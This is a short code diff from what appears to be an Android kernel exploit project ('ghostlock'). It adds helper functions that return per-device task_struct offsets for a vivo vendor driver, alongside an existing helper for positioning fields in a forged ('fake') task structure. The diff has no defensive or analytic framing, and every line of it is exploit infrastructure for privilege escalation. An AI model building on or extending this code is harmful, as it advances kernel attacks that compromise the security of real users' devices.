@@ -116,6 +116,23 @@ namespace ghostlock::profile {
         return values && values->offsets.sys_exit_tp_funcs != 0;
     }
 
+    /* vivo vr.ko per-task tag offsets (W2b). 0 = profile did not carry the
+     * vendor_boot probe result; callers fall back to the measured family
+     * constants. These are task_struct member byte offsets (6 / 0x2c), NOT
+     * image offsets, so they are read raw without the KIMAGE_TEXT_BASE
+     * rebasing the symbol_image accessors apply. */
+    inline uint32_t vr_tag_a_off() {
+        const kernel_offsets *values =
+            ghostlock::session::g_exploit_session.profile.values();
+        return values ? static_cast<uint32_t>(values->offsets.vr_tag_a) : 0;
+    }
+
+    inline uint32_t vr_tag_b_off() {
+        const kernel_offsets *values =
+            ghostlock::session::g_exploit_session.profile.values();
+        return values ? static_cast<uint32_t>(values->offsets.vr_tag_b) : 0;
+    }
+
     inline uint32_t fake_task_prio_off() {
         return symbol_u32([](const kernel_offsets &v) { return v.task.prio; }, 0x94);
     }
